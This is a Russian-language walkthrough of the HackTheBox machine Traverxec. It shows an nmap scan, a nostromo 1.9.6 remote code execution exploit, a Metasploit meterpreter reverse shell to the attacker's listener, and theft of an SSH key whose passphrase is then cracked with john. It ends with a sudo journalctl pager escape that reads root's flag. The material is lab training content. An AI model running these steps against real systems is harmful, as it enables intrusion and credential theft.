# Traverxec
## HTB machine

- Название: Traverxec  
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 16.11.19

## Write-up

```html
┌─[✗]─[user@parrot]─[~/Downloads]
└──╼ $nmap -sC -sV 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 06:45 AKDT
Nmap scan report for 10.10.10.165
Host is up (0.078s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    <mark>nostromo 1.9.6</mark>
|_http-server-header: <mark>nostromo 1.9.6</mark>
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```

>Так как ни dirbuster, ни исходники не дали никакой информации, поищем информацию по серверу nostromo.
>У этой версии сервера есть уязвимость, позволяющая удаленно выполнить произвольный код, эксплойт найден на exploit-db.

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $python 47837.py 10.10.10.165 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Tue, 07 Apr 2020 15:51:21 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Обнаружен пользователь david, он же фигурирует на главной странице сайта, видимо он и является следующей целью:

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #python 47837.py 10.10.10.165 80 'last'


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Tue, 07 Apr 2020 16:29:16 GMT
Server: nostromo 1.9.6
Connection: close


david    pts/9        10.10.15.22      Tue Apr  7 12:24   still logged in
david    pts/5        10.10.15.168     Tue Apr  7 12:21   still logged in
david    pts/5        10.10.15.168     Tue Apr  7 12:10 - 12:21  (00:11)
david    pts/5        10.10.15.168     Tue Apr  7 12:07 - 12:10  (00:03)
david    pts/4        10.10.14.129     Tue Apr  7 12:06   still logged in
david    pts/3        10.10.15.159     Tue Apr  7 12:06   still logged in
david    pts/2        10.10.15.151     Tue Apr  7 12:06   still logged in
david    pts/1        10.10.14.120     Tue Apr  7 12:06   still logged in
david    pts/0        10.10.15.46      Tue Apr  7 12:06   still logged in
reboot   system boot  4.19.0-6-amd64   Tue Apr  7 12:06   still running
root     tty1                          Sat Nov 16 16:07 - down   (00:05)
reboot   system boot  4.19.0-6-amd64   Sat Nov 16 16:06 - 16:13  (00:07)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 06:31 - 16:13 (4+09:41)
root     tty1                          Tue Nov 12 06:27 - down   (00:03)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 06:27 - 06:31  (00:03)
root     tty1                          Tue Nov 12 06:23 - down   (00:04)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 04:57 - 06:27  (01:30)
root     tty1                          Tue Nov 12 04:53 - down   (00:03)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 04:53 - 04:56  (00:03)
root     tty1                          Tue Nov 12 04:38 - down   (00:15)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 04:06 - 04:53  (00:46)
root     tty1                          Tue Nov 12 04:05 - down   (00:00)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 04:04 - 04:06  (00:01)
root     tty1                          Tue Nov 12 04:02 - down   (00:02)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 04:01 - 04:04  (00:02)
root     tty1                          Tue Nov 12 03:59 - down   (00:01)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 03:59 - 04:01  (00:01)
root     tty1                          Tue Nov 12 03:56 - down   (00:03)
root     tty1                          Tue Nov 12 03:51 - 03:56  (00:04)
reboot   system boot  4.19.0-6-amd64   Tue Nov 12 03:50 - 03:59  (00:08)

wtmp begins Sun Oct 27 16:25:39 2019
```

>Но так составлять запросы неудобно и долго, поэтому прибегнем к помощи metasploit:

```html
┌─[root@parrot]─[/home/user/Downloads]
└──╼ #msfconsole
[-] ***rting the Metasploit Framework console...|
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1969 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  <mark>exploit/multi/http/nostromo_code_exec</mark>  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution

msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
```

>Установим необходимые цели:

```html
msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set SRVHOST 10.10.15.224
SRVHOST => 10.10.15.224
msf5 exploit(multi/http/nostromo_code_exec) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.15.224
LHOST => 10.10.15.224
msf5 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3021284 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.10.10.165:47034) at 2020-04-07 08:50:36 -0800
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > shell
Process 6310 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (457): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Отображение содержимого домашней директории юзера david для нас закрыто.

```html
www-data@traverxec://home$ ls
ls
david
www-data@traverxec://home$ cd david
cd david
www-data@traverxec://home/david$ ls
ls
ls: cannot open directory '.': Permission denied
```

>Но в файле nhttpd.conf говорится о директории public_www, лежащей в домашней директории:

```html
www-data@traverxec://var/nostromo/conf$ ls
ls
mimes
nhttpd.conf
www-data@traverxec://var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

>Попробуем зайти в нее:

```html
www-data@traverxec://home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```

>Скачаем архив:

```html
meterpreter > download /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
[*] Downloading: /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] download   : /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
```

>Распаковав получаем ssh ключи, включая приватный.

```html
┌─[✗]─[root@parrot]─[/home/user/Downloads]
└──╼ #tar -zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

>Теперь из приватного ключа нам необходимо вытащить ключевую фразу:

```html
┌─[root@parrot]─[/home/user/Downloads/home/david/.ssh]
└──╼ #python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

┌─[✗]─[root@parrot]─[/home/user/Downloads/home/david/.ssh]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
<mark>hunter</mark>           (id_rsa)
1g 0:00:00:10 DONE (2020-04-07 09:13) 0.09328g/s 1337Kp/s 1337Kc/s 1337KC/sa6_123..*7¡Vamos!
Session completed
```

>Теперь, с помощью ключа и фразы, войдем как david:

```html
┌─[root@parrot]─[/home/user/Downloads/home/david/.ssh]
└──╼ #ssh -i id_rsa david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Apr  7 13:05:28 2020 from 10.10.15.22
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec207**********
```

>Просмотрим директорию bin:

```html
david@traverxec://home/david/bin$ ls
server-stats2.sh  server-stats.head  server-stats.sh  test
david@traverxec://home/david/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

>Если погуглить о journalctl, можно найти эту ссылку -- https://gtfobins.github.io/gtfobins/journalctl/
>Спустя несколько попыток, удается прочесть файл root.txt</p>

```html
david@traverxec://home/david/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2020-04-07 13:04:58 EDT, end at Tue 2020-04-07 13:26:57 EDT. --
Apr 07 13:22:33 traverxec sudo[2757]: pam_unix(sudo:auth): authentication failure; logname= ui
Apr 07 13:22:34 traverxec sudo[2757]: pam_unix(sudo:auth): conversation failed
Apr 07 13:22:34 traverxec sudo[2757]: pam_unix(sudo:auth): auth could not identify password fo
Apr 07 13:22:34 traverxec sudo[2757]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/
Apr 07 13:22:34 traverxec crontab[2810]: (www-data) LIST (www-data)
!cat /root/root.txt
9aa36a6d76f785dfd320a4**********
!done  (press RETURN)
```
